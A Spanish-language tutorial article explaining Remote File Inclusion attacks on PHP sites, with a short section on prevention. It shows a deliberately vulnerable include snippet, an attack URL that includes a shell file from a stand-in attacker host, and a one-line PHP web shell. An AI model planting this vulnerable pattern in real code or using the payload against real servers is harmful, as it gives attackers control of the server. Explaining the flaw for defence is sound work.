@@ -1,0 +1,65 @@
+Inclusión de ficheros remotos (RFI Remote File Inclusion) (Ataques Informáticos II)
+En esta segunda entrega de las descripciones de los diferentes tipos de ataques informáticos vamos a conocer a un ataque llamado RFI 
+(Remote File Inclusion). El RFI es uno de los ataques favoritos contra (o a través) de páginas web para los hackers, en 2011 se situó 
+entre los cuatro ataques más comunes contra páginas web. Este tipo de ataques es tan popular ya que a través de una explotación exitosa 
+çde la vulnerabilidad obtener el control del servidor de la web y además permite un realizar defacements de manera relativamente sencilla. 
+Recordemos el gran ataque contra blogs WordPress que tuvo lugar hace unos meses, este tuvo lugar por culpa de una vulnerabilidad LFI en un 
+add-on de WordPress.
+
+RFI o LFI es posible gracias a la existencia de parámetros vulnerables en el código PHP en las páginas web que referencian a objetos externos 
+sin filtrarlos.
+
+El ataque RFI es posible solo en páginas web que cumplan con ciertos requisitos:
+
+Primero deben tener código PHP, ya que permite enlace a archivos remotos. Actualmente se calcula que tres cuartas partes de las webs 
+contienen código PHP, entre ellas Facebook, Wikipedia, WordPress...
+La programación del código debe contener errores básicos de seguridad (aunque mucho más comunes de lo que se pueda pensar) como la falta 
+de filtrado de los datos.
+PHP es un lenguaje de programación de uso en servidor especialmente diseñado para producir páginas web dinamicamente y sin duda es una 
+de las mejores parejas para HTML y aún muchísimo más popular que ASP.NET, Java, Perl, Python.. para estas tareas.
+
+Como funciona la vulnerabilidad RFI/LFI
+Como hemos dicho esta se basa en la capacidad de PHP de incluir archivos externos al servidor, pondremos un ejemplo. Supongamos que tenemos 
+un fichero PHP (o de otro tipo) con un código que ejecuta una tarea que usaremos en muchas de nuestras páginas. Tenemos la opción a través 
+de la función include o require, de llamar a este archivo, de esa manera si tenemos que cambiar algo en este proceso solo deberemos modificar 
+un fichero y el resto de nuestra web seguirá funcionando perfectamente.
+
+El problema con la función include aparece si el código de llamada de esta función no está suficientemente filtrado, en ese caso podríamos 
+crear una petición manipulada a través de la cual podríamos ejecutar código, añadir ficheros... directamente en el servidor. Veamos un ejemplo:
+
+
+Tenemos una página web que en uno de sus ficheros contiene esta porción de código PHP
+
+ejemplo.php
+<?php
+include $_REQUEST['fichero'];
+?>
+
+en este caso al visitar la web es posible que viéramos en la barra de direcciones, algo como
+
+http://www.ejemplo.com/ejemplo.php?fichero=datos.csv
+ 
+en este caso el atacante podría crear una petición para la página vulnerable
+
+http://www.ejemplo.com/ejemplo.php?fichero=http://www.atacante.com/shell.txt&&cmd=ls
+
+shell.txt
+<?
+system($cmd)
+?>
+
+como vemos el archivo shell.txt es simplemente una llamada a ejecutar cmd. La anterior petición, ejecutaría la llamada a cmd y ejecutaría el 
+comando ls para mostrarnos el contenido de la carpeta del servidor remoto. De la misma manera podríamos ir creando diferentes llamadas para 
+realizar otro tipo de acciones más invasivas, o directamente servirnos de una shell PHP para manejar el servidor atacado con total libertad.
+
+Como evitar RFI
+
+En el caso que seamos nosotros mismos los programadores de la web, debemos tener en cuenta que funciones pueden llegar a ser peligrosas si 
+no las usamos de manera adecuada en nuestro código, por poner algunos ejemplos las funciones Include(), Include_once(), require(), Require_once(), 
+eval(), exec(), passthru(), system(), popen(), fopen(), readfile(), file(), readfile(), file() son algunas sobre las que tendremos que tener 
+especial cuidado para no exponer nuestros servidores a través de un código mal escrito.
+
+En el caso de que el código haya sido desarrollado por terceros como siempre conviene mantener los distintos componentes actualizados y 
+mantenerse al día de los distintos modos de ataque sobre estas vulnerabilidades para poder probarlos antes que nadie sobre nuestra propia web 
+y ver si presenta vulnerabilidades, desconfiando de plugin y/o addons de terceros que en la mayoría de los casos no necesitamos realmente y 
+solo añaden problemas de seguridad a nuestros sitios web.
